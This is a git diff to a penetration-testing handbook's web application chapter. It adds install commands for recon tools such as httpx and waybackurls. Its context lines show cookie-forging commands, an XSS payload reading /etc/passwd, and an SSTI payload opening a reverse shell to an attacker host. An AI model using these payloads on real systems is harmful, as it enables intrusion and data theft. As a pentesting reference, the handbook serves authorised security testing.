@@ -17,12 +17,16 @@
 - [feroxbuster](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#feroxbuster)
 - [ffuf](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#ffuf)
 - [Flask-Unsign](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Flask-Unsign)
+- [gf](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#gf)
 - [GitTools](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#GitTools)
 - [GIXY](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#GIXY)
 - [Gobuster](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Gobuster)
+- [gron](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#gron)
 - [Hakrawler](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Hakrawler)
 - [Host Header Regex Bypass](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Host-Header-Regex-Bypass)
 - [HTML Injection](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#HTML-Injection)
+- [httprobe](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#httprobe)
+- [httpx](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#httpx)
 - [Interactsh](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Interactsh)
 - [JavaScript](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#JavaScript)
 - [JWT_Tool](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#JWT_Tool)
@@ -40,7 +44,9 @@
 - [Remote File Inclusion (RFI)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Remote-File-Inclusion)
 - [Server-Side Request Forgery (SSRF)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Server-Side-Request-Forgery)
 - [Server-Side Template Injection (SSTI)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Server-Side-Template-Injection)
+- [unfurl](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#unfurl)
 - [Upload Vulnerabilities](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Upload-Vulnerabilities)
+- [waybackurls](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#waybackurls)
 - [Web Log Poisoning](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Web-Log-Poisoning)
 - [Wfuzz](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#Wfuzz)
 - [WhatWeb](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/03_web_application_analysis.md#WhatWeb)
@@ -412,6 +418,14 @@ $ flask-unsign --sign --cookie "{'logged_in': True}" --secret '<PASSWORD>'
 $ flask-unsign --sign --cookie "{'cart_items': ["2" , "5" , "6"], 'uuid': 'e9e62997-0291-4f63-8dbe-10d035326c75' }" --secret '<SECRET_KEY>'
 ```
 
+## gf
+
+> https://github.com/tomnomnom/gf
+
+```c
+$ go install github.com/tomnomnom/gf@latest
+```
+
 ## GitTools
 
 > https://github.com/internetwache/GitTools
@@ -494,6 +508,14 @@ $ gobuster vhost -u <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS
 $ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<RHOST>/ -a Linux
 ```
 
+## gron
+
+> https://github.com/tomnomnom/gron
+
+```c
+$ go install github.com/tomnomnom/gron@latest
+```
+
 ## Hakrawler
 
 > https://github.com/hakluke/hakrawler
@@ -549,6 +571,22 @@ document.write(this.responseText)
 x.open("GET","file:///etc/passwd");
 x.send();
 </script>
+```
+
+## httprobe
+
+> https://github.com/tomnomnom/httprobe
+
+```c
+$ go install github.com/tomnomnom/httprobe@latest
+```
+
+## httpx
+
+> https://github.com/projectdiscovery/httpx
+
+```c
+$ go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
 ```
 
 ## Interactsh
@@ -2946,6 +2984,14 @@ ${{<%[%'"}}%\.
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<LHOST>\",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
 ```
 
+## unfurl
+
+> https://github.com/tomnomnom/unfurl
+
+```c
+$ go install github.com/tomnomnom/unfurl@latest
+```
+
 ## Upload Vulnerabilities
 
 ```c
@@ -2959,6 +3005,14 @@ HTML/JS: HTML Injection / XSS / Open Redirect
 PNG / JPEG: Pixel Flood Attack
 ZIP: Remote Code Exection via Local File Inclusion
 PDF / PPTX: Server-Side Request Forgery / Blind XXE
+```
+
+## waybackurls
+
+> https://github.com/tomnomnom/waybackurls
+
+```c
+$ go install github.com/tomnomnom/waybackurls@latest
 ```
 
 ## Web Log Poisoning
